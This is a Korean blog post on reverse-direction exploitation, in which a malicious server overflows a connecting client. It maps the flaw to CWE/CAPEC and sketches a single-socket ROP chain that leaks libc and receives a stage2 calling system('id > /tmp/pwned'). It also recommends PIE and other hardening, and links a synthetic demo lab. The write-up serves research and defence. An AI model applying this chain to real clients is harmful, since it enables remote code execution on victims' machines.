---
title: "하나의 소켓으로 leak하고 stage2까지: 역방향 단일 소켓 스테이징"
date: 2026-08-15
translationKey: "reverse-single-socket-staging"
draft: false
featured: true
image: "/images/post/reverse-single-socket-staging/cover.png"
description: "악성 서버가 접속해온 클라이언트를 치는 역방향 메모리 손상에서, 이미 열린 하나의 소켓으로 libc를 유출하고 stage2까지 받아 단일 ROP 체인으로 RCE를 완성하는 기법. 그리고 이게 왜 새로운 패턴이 아니라 잘 알려진 조합인지."
tags:
  - Code
  - Offensive Security
  - Exploit Development
  - Binary Exploitation
  - ROP
  - ret2libc
  - ASLR
  - Vulnerability Research
categories:
  - 보안 연구
---

# 하나의 소켓으로 leak하고 stage2까지: 역방향 단일 소켓 스테이징

> 어떤 진단에서 "이건 좀 특이한 패턴 아닌가" 싶은 익스플로잇을 하나 완성했다. 악성 서버가 접속해온 클라이언트를 치는데, leak과 2차 페이로드를 **이미 열린 하나의 소켓**으로 단일 ROP 체인 안에서 처리했다. 인상적이라고 생각했는데, 파고들수록 결론은 정반대였다. 기법은 하나도 새롭지 않았고, 그 사실이 오히려 더 유용한 이야기였다.

> 대상 제품의 세부는 조율된 공개(coordinated disclosure)가 끝날 때까지 밝히지 않는다. 이 글과 함께 공개하는 코드는 전부 **합성 예제**다. 실제 바이너리·실제 가젯 주소·실제 프로토콜은 없다. 기법 자체가 이미 공개된 것들이라 이렇게 해도 설명에 부족함이 없다.

## 1. "특이하다"는 직감의 함정

레거시 네이티브 클라이언트를 하나 보다가 전형적인 결함을 만났다. 서버가 보낸 길이 값을 상한 검사 없이 고정 스택 버퍼에 `recv`한다. 서버가 길이를 크게 부르면 저장된 반환주소가 덮인다. 빌드는 옛날 그대로 **No PIE / No canary / NX / Partial RELRO**.

여기까지는 흔하다. 그런데 익스플로잇을 짜다 보니 조건이 묘했다. 대상이 **단발성 클라이언트**였다. 요청 한 번 처리하고 죽는 프로세스. 그리고 공격 방향이 뒤집혀 있었다 — 내가 서버를 사칭/중간자로 잡고, **접속해온 클라이언트**를 친다.

그래서 leak과 실행을 **하나의 커넥션·하나의 오버플로우·하나의 ROP 체인** 안에 다 넣어야 했다. 이걸 소켓 유출로 풀었을 때 "이거 좀 특이한데?" 싶었다. 결론부터 말하면, 이 직감은 **절반만 맞았다.**

## 2. 취약점 유형(CWE)도, 공격 패턴(CAPEC)도 새롭지 않다

먼저 분류부터. 이게 정말 새로운 것이라면 어딘가 등록되지 않은 유형이어야 한다. 그런데 아니다.

**약점 자체**는 기존 CWE의 정석적 조합이다.

- 근본원인: [CWE-130 (Improper Handling of Length Parameter Inconsistency)](https://cwe.mitre.org/data/definitions/130.html), [CWE-20](https://cwe.mitre.org/data/definitions/20.html)
- 발현: [CWE-805 (Buffer Access with Incorrect Length Value)](https://cwe.mitre.org/data/definitions/805.html), [CWE-121 (Stack-based Buffer Overflow)](https://cwe.mitre.org/data/definitions/121.html)
- 전송/신뢰: [CWE-319 (Cleartext Transmission)](https://cwe.mitre.org/data/definitions/319.html), [CWE-345 (Insufficient Verification of Data Authenticity)](https://cwe.mitre.org/data/definitions/345.html)

**공격 패턴**도 마찬가지다. CAPEC은 의도적으로 추상적이라 "front-load ROP" 같은 익스플로잇 단위를 담지 않는다. 이 공격은 기존 CAPEC 체인으로 그대로 표현된다.

```text
딜리버리:  CAPEC-94 (Adversary in the Middle)
         + CAPEC-384 (API Message Manipulation via MitM)
         + CAPEC-194 (Fake the Source of Data)
익스플로잇: CAPEC-100 (Overflow Buffers)
         + CAPEC-8 (BOF in an API Call)
         + CAPEC-9 (BOF in Local Command-Line Utilities)
```

CWE도 CAPEC도 **새로 등록할 게 아니라, 이미 있는 것들을 정확히 매핑할 대상**이다. 클래스의 신규성으로 따지면 이 발견은 특이하지 않다. 그럼 내 직감은 완전히 틀린 걸까?

## 3. 특이한 건 "유형"이 아니라 "익스플로잇 제약"이었다

직감이 가리킨 진짜 지점은 분류가 아니라 **익스플로잇 조건의 난이도**였다.

교과서적인 원격 익스플로잇 — 예컨대 `ropasaurusrex`류 — 은 이렇게 흐른다.[^hacktricks][^rop]

```text
서버 프로세스에 연결
  -> 오버플로우 #1: write(fd, GOT, len)으로 libc leak, 취약 함수로 복귀
  -> 같은 프로세스가 루프를 돌며 stage2를 다시 read
  -> 오버플로우 #2: 이제 실제 주소로 ret2libc system("/bin/sh")
```

이게 성립하는 이유는 **타깃이 재진입 가능한 서버**이고, **한 프로세스가 연결 내내 유지**되기 때문이다. 오버플로우 #1에서 leak한 base가 오버플로우 #2에서 그대로 유효하다.

역방향 단발 클라이언트에서는 이 루프가 **원천 봉쇄**된다.

- **재진입이 없다.** 단발 CLI라 "취약 함수로 복귀해 다시 read" 같은 게 없다.
- **매 실행마다 ASLR이 새로 뽑힌다.** 프로세스 A에서 leak한 base는 프로세스 B에서 아무 의미가 없다. "요청 A에서 leak, 요청 B에서 pwn"이 죽는다.

그래서 leak과 stage2 실행이 **반드시 같은 프로세스·같은 커넥션·같은 체인**에 들어가야 한다. 이게 직감이 감지한 진짜 특이점이었다 — 유형이 아니라 **제약**.

## 4. 이미 열린 소켓 하나로, 두 방향으로

그 제약의 답은 사실 다른 동네에 이미 있었다. Borja Merino의 [**Windows-One-Way-Stagers**](https://github.com/BorjaMerino/Windows-One-Way-Stagers)가 다루는 아이디어 — 방화벽·제한 환경에서 **새 연결을 열지 말고 이미 열린 소켓을 재사용**하라 — 가 그것이다.[^oneway]

역방향 클라이언트 익스플로잇에서는 이 소켓이 **자연스럽게 유일한 채널**이다. 피해자가 나(악성 서버)에게 연 그 연결이, leak을 내보내는 통로이자 stage2를 받아들이는 통로다. one-way stager를 **두 방향(leak out + stage2 in)으로, 단일 체인 안에서** 돌리는 셈이다.

방향 자체("악성 서버가 클라이언트를 친다")도 새롭지 않다. Check Point가 2019년 [**Reverse RDP Attack**](https://research.checkpoint.com/2019/reverse-rdp-attack-code-execution-on-rdp-clients/)으로 이름 붙여 대중화한 클래스다.[^rdp] 그 뒤로도 "서버가 제어하는 길이 필드 + 클라이언트 복사 루틴의 경계검사 부재 → 클라이언트 RCE"는 꾸준히 CVE가 된다(FreeRDP 계열 등).

즉 재료는 전부 공개돼 있었다. 내가 한 건 **재료를 이 제약 아래 하나로 조립**한 것뿐이다.

## 5. 체인

핵심만 추리면 이렇다. stage-1 ROP는 피해자 안에서 실행되며, 전부 연결된 소켓(`fd 3`) 위에서 벌어진다.

```text
pop rdi ; 3
pop rsi ; send@got
pop rdx ; 8
g_send0            # send(3, send@got, 8, 0)  -> libc 'send' 주소를 소켓으로 유출
pop rdi ; 3
pop rsi ; STAGE2
pop rdx ; 0x100
g_recv0            # recv(3, STAGE2, 0x100, 0) -> 여기서 블로킹, stage2를 기다림
pop rsp ; STAGE2   # 받은 stage2로 스택 피벗
```

악성 서버(나)는 8바이트 leak을 받은 뒤에야 stage2를 만든다.

```text
libc_base = leak - libc.sym.send
stage2    = [ ret ; pop rdi ; &cmd ; system ] + b"id > /tmp/pwned; ...\0"
send(stage2)       # 피해자의 recv가 풀리고 -> 피벗 -> system(cmd)
```

`system` 앞의 `ret` 하나는 16바이트 정렬(`movaps` 함정) 보정이다. `STAGE2`는 고정·매핑된 전역 상단에 둬서 `system`이 아래로 프레임을 쓸 공간을 확보한다.

### 왜 한 패킷이 아니라 두 패킷인가

stage2에는 **런타임 `system` 주소**가 박힌다. 그 값은 leak이 나에게 되돌아온 뒤에야 안다. 그러니 stage2는 stage1과 물리적으로 **동봉 불가능**하다. 그런데도 이게 **단일 커넥션**인 이유는, stage1 체인이 자기 안에 `recv` 가젯을 품고 있어서 피해자가 leak을 뱉은 직후 **체인 중간에서 recv로 멈춰** 같은 소켓으로 stage2를 기다리기 때문이다. 왕복이 스스로 동기화를 만든다.

```text
악성서버 ──(1) 오버플로우 응답────▶ 피해자
피해자  ──(2) send(send@got) ────▶ 악성서버     # leak
악성서버 ──(3) stage2(실주소) ────▶ 피해자        # recv 풀림 -> 피벗 -> system()
```

## 6. 방어 경계는 ASLR도 카나리도 아닌 PIE다

이 익스플로잇이 full ASLR에서 `uid=0`을 내는 건, ASLR이 무력해서가 아니라 **바이너리가 non-PIE**라서다. non-PIE면 코드·PLT·GOT·가젯 주소가 전부 고정이라, 소켓 leak으로 libc만 한 번 풀면 ret2libc가 성립한다. 카나리 부재나 null-truncation 유무는 방벽이 아니다.

반대로 **PIE + full ASLR**이면 가젯 주소 자체가 무작위라 최초 leak의 고정 앵커가 사라진다. 같은 버그가 원격 **DoS 상한**으로 내려간다. 그래서 운영 바이너리의 `checksec`(특히 PIE 여부)이 최종 심각도를 가른다. 조치도 명확하다 — 경계 검사 + **PIE·카나리·Full RELRO 재빌드** + TLS/서버 인증 + 응답 무결성.

## 7. 직접 돌려보기

기법을 그대로 재현하는 합성 랩을 공개한다. 실제 제품이 아니라, 같은 성질(non-PIE·서버제어 길이 오버플로우·역방향)을 가지도록 내가 새로 짠 데모다.

**저장소:** [github.com/windshock/Linux-Reverse-Socket-Stagers](https://github.com/windshock/Linux-Reverse-Socket-Stagers)

```bash
git clone https://github.com/windshock/Linux-Reverse-Socket-Stagers
cd Linux-Reverse-Socket-Stagers/01-single-socket-reverse-stager
# Apple Silicon: colima start --arch x86_64
./run.sh
```

격리 컨테이너에서 full ASLR을 켜고, 단일 악성 응답으로 `uid=0`을 재현한다. 프로토콜·가젯·오프셋은 전부 이 데모의 것이며, 어떤 제품과도 무관하다.

## 8. 정리

처음 질문은 "이거 특이한 패턴 아냐?"였다. 정직한 답은 이렇다.

- **유형으로는 특이하지 않다.** CWE도 CAPEC도 새로 만들 게 아니라 기존 것을 매핑할 대상이다. staged GOT-leak → ret2libc는 교과서고, 소켓 재사용 스테이징도, 역방향 클라이언트 공격도 전부 공개된 계보다.
- **제약으로는 의미가 있다.** 단발 프로세스 + full ASLR + 크로스커넥션 leak 불가라는 더 어려운 조건에서, 이미 열린 하나의 소켓으로 leak과 stage2를 단일 체인에 담아낸 조립이 이 작업의 값어치다.

기법의 신규성과 발견의 가치는 별개다. 흔한 클래스일수록 "왜 아직도 안 고쳐졌나"가 부각되고, 그 자체가 심각도 서사를 강화한다. 그리고 그 조립을 공개된 언어(CWE/CAPEC/선례)로 정확히 설명할 수 있다는 게, 인상에 취하는 것보다 훨씬 쓸모 있다.

---

## 참고

[^hacktricks]: HackTricks, "Leaking libc address with ROP" — staged GOT-leak → ret2libc 템플릿. <https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address/index.html>
[^rop]: `write(fd, GOT, len)` 소켓 leak + 2단계 ret2libc의 대표 write-up 예. <https://github.com/jakecraige/ctf/blob/master/csaw-quals-2020/roppity/writeup.md> · ret2csu/pivot 참고: <https://ropemporium.com/>
[^oneway]: Borja Merino, "Windows-One-Way-Stagers" — 소켓 재사용/재바인드 스테이거. <https://github.com/BorjaMerino/Windows-One-Way-Stagers>
[^rdp]: Check Point Research, "Reverse RDP Attack: Code Execution on RDP Clients" (2019). <https://research.checkpoint.com/2019/reverse-rdp-attack-code-execution-on-rdp-clients/>
